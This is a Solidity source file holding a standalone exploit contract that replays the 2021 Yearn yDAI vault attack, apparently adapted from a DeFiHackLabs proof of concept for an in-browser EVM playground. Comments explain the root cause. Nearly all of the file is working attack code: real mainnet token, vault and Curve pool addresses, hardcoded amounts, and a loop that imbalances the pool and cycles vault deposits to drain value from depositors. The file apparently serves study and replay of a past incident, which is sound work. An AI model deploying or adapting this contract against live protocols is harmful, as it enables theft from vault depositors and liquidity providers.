// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-02-Yearn_ydai).
//
// The DeFiHackLabs PoC (test/Yearn_ydai_exp.sol) runs the attack INLINE in the
// Foundry `Exploit is Test` contract — there is no standalone exploit contract to
// deploy. This contract is a faithful, self-contained copy of that inline attack
// (setUp's approvals + testAttack's body), so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from the registry PoC.
//
// The only deviation from the test: the `vm.store`/`stdstore` cheatcodes that
// (a) seed the attacker with DAI/USDC in setUp, and (b) zero them back out at the
// end to isolate the printed profit, are NOT replicable in the in-browser EVM.
// (a) is instead done by the recorder via setup.dealToken before run() is called;
// (b) only isolates a console.log and is irrelevant to the 3Crv profit measured.
//
// Root cause: the yDAI v1 vault prices its shares off a strategy whose valuation
// and whose earn()-driven Curve deposits both pass through a pool the same caller
// can imbalance in the same transaction. Interleaving imbalanced Curve round-trips
// with vault deposit->earn->withdrawAll cycles forces the strategy to single-sided
// deposit DAI into a USDT-starved pool on the favorable side of the imbalance fee,
// rebalancing it cheaply and accruing surplus 3Crv + USDT to the attacker's own LP
// position at the expense of the vault's existing depositors and Curve LPs.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ICurve {
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
    function remove_liquidity_imbalance(uint256[3] memory amounts, uint256 max_burn_amount) external;
}

interface IYVDai {
    function balanceOf(address) external view returns (uint256);
    function deposit(uint256 _amount) external;
    function earn() external;
    function withdrawAll() external;
}

contract YearnYdaiDrain {
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    IERC20 constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant usdt = IERC20(USDT);
    IERC20 constant crv3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IYVDai constant yvdai = IYVDai(0xACd43E627e64355f1861cEC6d3a6688B31a6F952);
    ICurve constant curve = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);

    // Low-level approve that tolerates a missing bool return (legacy non-standard
    // ERC20s like USDT). Mirrors the test's TransferHelper.safeApprove.
    function _safeApprove(address token, address spender, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    uint256 constant max_3crv_amount = 300_000_000_000_000_000_000_000_000;
    uint256 constant remove_usdt_amt = 167_473_454_967_245;
    uint256 constant remove_usdt_amt_final_round = 167_288_317_922_857;
    uint256 constant init_add_dai_amt = 37_972_761_178_915_525_047_091_200;
    uint256 constant init_add_usdc_amt = 133_000_000_000_000;

    uint256[5] earn_amt = [
        105_469_871_996_916_702_826_725_376,
        104_706_920_396_703_142_299_856_646,
        103_948_014_417_774_019_565_578_888,
        103_192_919_800_803_744_390_557_088,
        102_441_640_504_232_413_679_923_590
    ];

    // The recorder calls this after setup has dealt DAI/USDC into this contract.
    function run() external {
        // --- approvals (mirrors the test's setUp) ---
        dai.approve(address(yvdai), type(uint256).max);
        // USDT (legacy TetherToken) returns void from approve(), not bool, so a
        // direct IERC20.approve reverts on the missing return. Use the same
        // low-level tolerate-empty pattern the test's TransferHelper.safeApprove uses.
        _safeApprove(USDT, address(curve), type(uint256).max);
        dai.approve(address(curve), type(uint256).max);
        usdc.approve(address(curve), type(uint256).max);

        // sanity: exploit starts with no 3Crv/USDT/yDAI
        require(usdt.balanceOf(address(this)) == 0, "has usdt");
        require(crv3.balanceOf(address(this)) == 0, "has crv3");
        require(yvdai.balanceOf(address(this)) == 0, "has yvdai");

        uint256 hacker_dai_amt_before = dai.balanceOf(address(this));
        uint256 hacker_usdc_amt_before = usdc.balanceOf(address(this));

        // First make the pool imbalanced (LP in DAI/USDC, minting 3Crv).
        curve.add_liquidity([init_add_dai_amt, init_add_usdc_amt, 0], 0);

        // Exploit loop — 5 vault-subsidized rebalance cycles.
        for (uint256 i = 0; i < 5; i++) {
            curve.remove_liquidity_imbalance([0, 0, remove_usdt_amt], max_3crv_amount);

            yvdai.deposit(earn_amt[i]);
            yvdai.earn();

            if (i != 4) {
                curve.add_liquidity([0, 0, remove_usdt_amt], 0);
            } else {
                curve.add_liquidity([0, 0, remove_usdt_amt_final_round], 0);
            }

            yvdai.withdrawAll();
        }

        // Close out: burn 3Crv to restore the DAI/USDC principal. The leftover
        // 3Crv (+ USDT) is the profit (read by the recorder as the 3Crv delta).
        uint256 dai_difference = hacker_dai_amt_before - dai.balanceOf(address(this));
        curve.remove_liquidity_imbalance([dai_difference + 1, init_add_usdc_amt + 1, 0], max_3crv_amount);
        require(dai.balanceOf(address(this)) == hacker_dai_amt_before + 1, "dai not restored");
        require(usdc.balanceOf(address(this)) == hacker_usdc_amt_before + 1, "usdc not restored");
    }
}
